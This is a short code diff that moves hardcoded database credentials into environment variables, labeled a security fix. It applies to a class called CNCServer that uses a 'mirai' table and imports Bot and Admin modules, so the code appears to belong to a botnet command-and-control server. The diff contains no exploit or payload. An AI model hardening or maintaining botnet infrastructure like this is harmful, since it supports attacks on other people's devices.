@@ -10,10 +10,16 @@ from .admin import Admin
 from .bot import Bot
 from .api import Api
 
-DATABASE_ADDR = "127.0.0.1"
-DATABASE_USER = "root"
-DATABASE_PASS = "password"
-DATABASE_TABLE = "mirai"
+import os
+
+# SECURITY FIX: Use environment variables instead of hardcoded credentials
+DATABASE_ADDR = os.getenv("DATABASE_ADDR", "127.0.0.1")
+DATABASE_USER = os.getenv("DATABASE_USER", "root")
+DATABASE_PASS = os.getenv("DATABASE_PASSWORD")
+DATABASE_TABLE = os.getenv("DATABASE_TABLE", "mirai")
+
+if not DATABASE_PASS:
+    raise ValueError("DATABASE_PASSWORD environment variable must be set")
 
 class CNCServer:
     def __init__(self):
